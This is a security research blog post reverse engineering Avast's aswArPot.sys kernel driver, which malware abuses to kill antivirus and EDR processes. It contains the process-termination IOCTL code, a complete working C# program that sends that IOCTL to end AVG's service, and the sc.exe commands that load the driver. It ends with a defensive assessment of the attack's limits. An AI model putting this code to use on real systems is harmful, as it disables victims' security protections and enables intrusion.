---
title: "Vulnerable Drivers"
date: 2024-12-14T09:06:53+00:00
slug: "vulnerable-drivers"
draft: false
description: "In this post I dive into the reverse engineering and abuse of vulnerable kernel drivers and how they are used to kill defensive solutions such as EDRs and AVs, using the example of aswArPot.sys, an anti-rootkit driver from Avast."
cover:
  image: "/images/2024/12/Screenshot-2024-12-14-170629.png"
  relative: false
  hiddenInList: false
tag: ["am i safe", "2024", "malware", "kernel", "driver", "exploitation", "aswArPot.sys"]
---

Imagine that one day, you wake up, start scrolling through your feed, and see this:
{{< bookmark
  url="https://thehackernews.com/2024/11/researchers-uncover-malware-using-byovd.html"
  title="Researchers Uncover Malware Using BYOVD to Bypass Antivirus Protections"
  description="Malware exploits Avast driver to bypass antivirus, terminate 142 processes, and disable security protections"
  favicon="/images/icon/thn.jpg"
  thumbnail="/images/thumbnail/av-kill.png"
  site="The Hacker News"
  author="The Hacker News"
>}}
Bypass antivirus, terminate 142 processes, disable security protections? Oh no! Sounds like trouble.

Reading the original report from Trellix, it seems like the malware abuses `aswArPot.sys`, a kernel driver from Avast that is an anti-rootkit driver meant to dislodge the most stubborn of malware, but now used as a anti-anti virus tool; talk about a double edged sword.

[https://www.trellix.com/blogs/research/when-guardians-become-predators-how-malware-corrupts-the-protectors/](https://www.trellix.com/blogs/research/when-guardians-become-predators-how-malware-corrupts-the-protectors/)

Malware authors prefer abusing existing kernel drivers instead of writing their own because existing kernel drivers are signed, which makes them more trustworthy in the eyes of the operating system.

So, is this malware really as scary as the research from Trellix makes it out to be? From the report it sounds like anyone could use this driver to kill any EDR/AV solution. Let's take a look.

# Reverse Engineering

The driver in question is fortunately available on LOLDrivers, so that is where we will start the investigation and load the driver into Ghidra for decompliation. Since we will be using symbols to help with the decompliation process, we will also import [ntddk_64.gdt](https://github.com/0x6d696368/ghidra-data/blob/master/typeinfo/ntddk_64.gdt) into Ghidra.
{{< bookmark
  url="https://www.loldrivers.io/drivers/57fc510a-e649-4599-b83e-8f3605e3d1d9/"
  title="57fc510a-e649-4599-b83e-8f3605e3d1d9asw"
  description="ArPot.sys Description Avast's \"Anti Rootkit\" driver (also used by AVG) has been found to be vulnerable to two high severity attacks that could potentially lead to privilege escalation by running code in the kernel from a non-administrator user. UUID: 57fc510a-e649-4599-b83e-8f3605e3d1d9 Created: 2023-01-09 Author: Michael Haag Acknowledgement: | @mattnotmax DownloadBlock This download link contains the vulnerable driver! Commands sc.exe create aswArPot.sys binPath=C:\windows\temp\aswArPot.sys type=kernel &amp;&amp; sc.exe start aswArPot.sys Use Case Privileges Operating System Elevate privileges kernel Windows 10 Detections YARA 🏹 Expand Exact Match"
  favicon="/images/icon/apple-touch-icon.png"
  thumbnail="/images/thumbnail/logo.png"
  site="LOLDrivers"
>}}
The first parameter that is passed to the `entry` function is the `DriverObject` so we will rename the parameter and trace it.

![](/images/2024/12/image-14.png)

As we are tracing, we note that the driver is loaded under `\\.\aswSP_Avar` with a symbolic link created, so we know what is the name of the file we will need to call to open a handle to the driver.

![](/images/2024/12/image-12.png)

To interact with the kernel driver after obtaining a handle, programs in userland send IOCTL (Device Input and Output Control) requests which will trigger functions in the kernel driver based on the IOCTL code and other data received.

We are most interested to find where the IOCTL codes are interpreted because that would be where we can trigger the vulnerable function so we need to find a reference to the IRP (I/O Request Packet) handlers which handle incoming requests from userland. This is available in the `DriverObject` struct with an offset of `0x70` under the `MajorFunction` member of the struct.

{{< figure src="/images/2024/12/image-21.png" alt="" caption="Struct for DriverObject" >}}

The `MajorFunction` is a struct containing reference to the IRP handlers. These are dispatch routines that describe what the driver must do when it receives an IOCTL request of a certain type.

{{< figure src="/images/2024/12/image-15.png" alt="" caption="Found reference to MajorFunction" >}}

Following along the code flow, we note that the code is associating `MajorFunction` offsets to a given function (`FUN_140014890`), including `0xe,` which is associated with `IRP_MJ_DEVICE_CONTROL`. This IRP handler handles IOCTL requests, so we will explore this function further.

The second parameter of this function is a pointer to an IRP so we will rename it accordingly and retype it to a `PIRP` parameter.

{{< figure src="/images/2024/12/image-16.png" alt="" caption="Size of function associated with IRP_MJ_DEVICE_CONTROL" >}}

This is a big function, so I decided to look for calls to external functions that have IRP as their second parameter as it didn't seem like the comparisons of the IOCTL codes were being made in this function after a preliminary analysis.

After going through a few functions, I discovered this function that looked interesting:

{{< figure src="/images/2024/12/image-8.png" alt="" caption="Calling function" >}}

By retyping the second parameter to a `PIRP` and renaming it, we get a clearer sense of the function. We also identified the `CurrentStackLocation` variable for reference clarity.

![](/images/2024/12/image-17.png)

There are a few offsets of the `CurrentStackLocation` struct that are used in the function that is called before `IofCompleteRequest`, but luckily someone else has already done the hard work of associating these offsets for us.

![](/images/2024/12/image-13.png)

This function takes in the IOCTL value, the input buffers, and the output buffers. It seems like it is taking in parameters that we would send to `DeviceIoControl` which is a userland function that sends IOCTL codes to drivers.

If we explore this function, we also find that it is a large function, however, the `IOCTL` variable makes comparisons with `dwords` in this function, making this a very promising function to explore as it is probably a switch case for the different `IOCTL` control codes.

{{< figure src="/images/2024/12/image-18.png" alt="" caption="Extra Large function" >}}

At this point if this is a new driver we are looking through, we can explore all the functions and the IOCTL calls. However, to speed up our reverse engineering, we can cheat a little by making an a priori assumption by looking for something to terminate processes, something like `ZwTerminateProcess` as seen in the imported functions table in Ghidra

![](/images/2024/12/image.png)

Jumping to the function that calls this imported function, we see that it opens a handle to the process with `ZwOpenProcess`, and if successful, will use the handle to terminate the process with `ZwTerminateProcess`.

![](/images/2024/12/image-1.png)

When we look for how this function is called, we find that it is only called in one place, which is our massive function that we found earlier that compares the IOCTL codes with `dwords`:

![](/images/2024/12/image-2.png)

![](/images/2024/12/image-20.png)

This section of code compares `IOCTL` with a negative hexadecimal value, which can also be represented as `0x9988c094`. This value is the IOCTL code used to call the function in the driver to terminate a given process.

However, in order to trigger the function associated with the IOCTL code, there are two conditions to fulfill: `inputBufferSize` must be 4 and `ioBuffer_2` must not be NULL. Since `ioBuffer_2` is passed as the PID in the `ZwOpenProcess` function (`&local_88`), we can assume that it is the input buffer and `inputBufferSize` is the size of the buffer we will need to pass to `DeviceIoControl`.

There does not seem to be any further authentication or verification processes so we can attempt to call the driver directly using the information we have gathered from reverse engineering the driver.

# Execution

The syntax for calling a driver and passing in the control code is as follows:

![](/images/2024/12/image-4.png)

We can write a simple C# program to interact with the driver. We will first obtain a handle to the driver before searching for a match of the process name to obtain the PID. We can then call the driver using the handle and fill in the other parameters with the information that we found earlier.

```C#
using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace MalDriverCaller
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DeviceIoControl(
                IntPtr hDevice,
                uint dwIoControlCode,
                IntPtr lpInBuffer,
                uint nInBufferSize,
                IntPtr lpOutBuffer,
                uint nOutBufferSize,
                out uint lpBytesReturned,
                IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile
        );

        static void Main(string[] args)
        {
            // get handle to the registered driver

            string driverPath = "\\\\.\\aswSP_Avar";
            IntPtr driverHandle = CreateFile(
                driverPath,
                0xC0000000,
                0x00000000,
                IntPtr.Zero,
                0x3,        // OPEN_EXISTING
                0x80,        
                IntPtr.Zero);
            if ((int)driverHandle == -1)
            {
                Console.WriteLine("[!] handle not found! Exiting");
                return;
            }
            else
            {
                Console.WriteLine($"[+] Handle for driver found at {driverHandle}");
            }
            // find all pids associated with notepad.exe
            var allProcesses = Process.GetProcesses();

            // Filter the processes to find those named "AVGSvc.exe"
            var notepadProcesses = allProcesses
                .Where(p => string.Equals(p.ProcessName, "AVGSvc", StringComparison.OrdinalIgnoreCase))
                .ToList();

            if (notepadProcesses.Any())
            {
                Console.WriteLine($"[+] Found {notepadProcesses.Count} instance(s) of AVG:");

                foreach (var process in notepadProcesses)
                {
                    Console.WriteLine($"[+] Process ID: {process.Id}, Name: {process.ProcessName}, Window Title: {process.MainWindowTitle}");

                    // Communicate with the driver using DeviceIoControl
                    int[] pid = new int[1];
                    pid[0] = process.Id;
                    uint ioctlCode = 0x9988c094;  // IOCTL code

                    IntPtr inBufferPtr = Marshal.AllocHGlobal(4);

                    Marshal.Copy(pid, 0, inBufferPtr, 1);
                    uint inBufferSize = 4;         // Input buffer size (bytes)
                    IntPtr outBuffer = IntPtr.Zero; // NULL
                    uint outBufferSize = 0;     // no size
                    uint bytesReturned;
                    Console.WriteLine($"[i] Calling driver on {process.Id} at {inBufferPtr}");
                    bool result = DeviceIoControl(
                        driverHandle,
                        ioctlCode,
                        inBufferPtr,
                        inBufferSize,
                        outBuffer,
                        outBufferSize,
                        out bytesReturned,
                        IntPtr.Zero);

                    if (result)
                    {
                        Console.WriteLine($"[+] DeviceIoControl succeeded, bytes returned: {bytesReturned}, kill confirmed");
                    }
                    else
                    {
                        Console.WriteLine("[-] DeviceIoControl failed. :(");
                    }
                    Marshal.FreeHGlobal( inBufferPtr );

                }
            }
            else
            {
                Console.WriteLine("[i] No instances of AVGSvc.exe found.");
            }
        }
    }
}

```

For the target, to demonstrate the effect of the driver, it must be something in userland that a normal user wouldn't be able to kill, so a good target would be another antivirus. Since I don't have access to an EDR, we should be able to settle for AVG antivirus since it provides an offline installer.

After installing, we note that a new service is created under the name of `AVGSvc` and we are not able to terminate it, even with elevated privileges as an Administrator.

![](/images/2024/12/image-9.png)

If we register and launch the driver with the following command:

```
sc.exe create aswArPot.sys binPath=C:\Users\ben\Desktop\ntfs.bin type=kernel && sc.exe start aswArPot.sys
```

We run into our first issue: we have insufficient privileges to install the driver.

![](/images/2024/12/image-24.png)

In a default configuration, only users with elevated privileges are allowed to install drivers. So for this attack to work, a user with administrative privileges must have been compromised.

So we elevate privileges and rerun the same command.

![](/images/2024/12/image-25.png)

We are successful in registering the service, but when we attempt to start the service, we are notified that we don't have access, and a few moments later, a notification from AVG pops up.

![](/images/2024/12/image-23.png)

![](/images/2024/12/image-10.png)

AVG has blocked this driver from loading. Changing options to allow the driver to start on reboot, turning off Microsoft Vulnerable Driver Blocklist all have no effect: the driver is still blocked from running.

So finally, we give in and manually turn off AVG's vulnerable driver blocklist, and rerun the exploit.

![](/images/2024/12/image-26.png)

Finally, we get the desired result. AVG is dead!

![](/images/2024/12/image-22.png)

{{< figure src="/images/2024/12/image-11.png" alt="" caption="AVG killed" >}}

# Analysis

If we consider the concessions that we took to trigger the vulnerability, there seems to be a few compromises before we could exploit the kernel driver.

- **Affected user needs administrative privileges or special configuration to launch services**. If an attacker has gained a foothold as a normal user, they would not be able to exploit the driver immediately, but must look for alternative privilege escalation techniques in order to gain those privileges.
- **Preinstalled defenses must not come with a driver blocklist or it must not be disabled**. If you don't use any defenses, that is on you. However, as clearly indicated with AVG, there is a driver blocklist in place, and I think this would be true for all modern AV or EDRs, unless they are manually disabled which begs a whole other set of questions.

Exploiting this particular driver requires a set of circumstances, which makes it narrowly useful in the case where the compromised Administrator on the local machine requires elevated privileges to remove kernel-level protections. This would make sense in the scenario where the local Administrator does not have sufficient privileges to remove the EDR/AV for example, on an enterprise device.

So the impact and the circumstances which it can be used may not be as broad as the report makes it out to be.

Additionally, considering that this vulnerable kernel driver has been signatured in 2022 by TrendMicro, unless faced with outdated antivirus solutions or old blocklists, I doubt that this particular malware was able to make much progress.
{{< bookmark
  url="https://www.trendmicro.com/en_sg/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html"
  title="Avos"
  description="Locker Ransomware Variant Abuses Driver File to Disable Anti-Virus, Scans for Log4shellWe found an AvosLocker ransomware variant using a legitimate antivirus component to disable detection and blocking solutions."
  favicon="/images/icon/favicon.ico"
  thumbnail="/images/thumbnail/cover-avoslocker-disables-defense-with-driver-file-scans-log4shell.jpg"
  site="Trend Micro"
  author="Contact Us"
>}}
I found the reports to be almost identical, so given all these factors, it may be less dangerous than initially presented.

Nevertheless, the road through an organisation's defenses is paved with no-fixes, outdated systems, individual non-malicious actions, and tradeoffs between risk and convenience, so malware that abuses this driver could still be effective in the wild.

My personal takeaway from this small bit of research is to keep your antivirus solutions updated, consider any deviations from the defaults carefully, and to take cybersecurity news with a grain of salt.

# References

[https://medium.com/@matterpreter/methodology-for-static-reverse-engineering-of-windows-kernel-drivers-3115b2efed83](https://medium.com/@matterpreter/methodology-for-static-reverse-engineering-of-windows-kernel-drivers-3115b2efed83)
{{< bookmark
  url="https://v1k1ngfr.github.io/winkernel-reverse-ida-ghidra/"
  title="Windows kernel driver static reverse using IDA and GHIDRASome notes for Windows drivers reversing with IDA and GHIDRA"
  favicon="/images/icon/apple-icon-180x180.png"
  thumbnail="/images/thumbnail/corn_kernels_ida_ghidra.jpg"
  site="Viking"
  author="Viking"
>}}{{< bookmark
  url="https://www.cyberark.com/resources/threat-research-blog/finding-bugs-in-windows-drivers-part-1-wdm"
  title="Finding Bugs in Windows Drivers, Part 1 – WDMFinding vulnerabilities in Windows drivers was always a highly sought-after prize by sophisticated threat actors, game cheat writers and red teamers. As you probably know, every bug in a driver…"
  favicon="/images/icon/favicon.png"
  thumbnail="/images/thumbnail/bug-driver-hero.jpg"
  site="Finding Bugs in Windows Drivers, Part 1 – WDMEran Shimony"
>}}
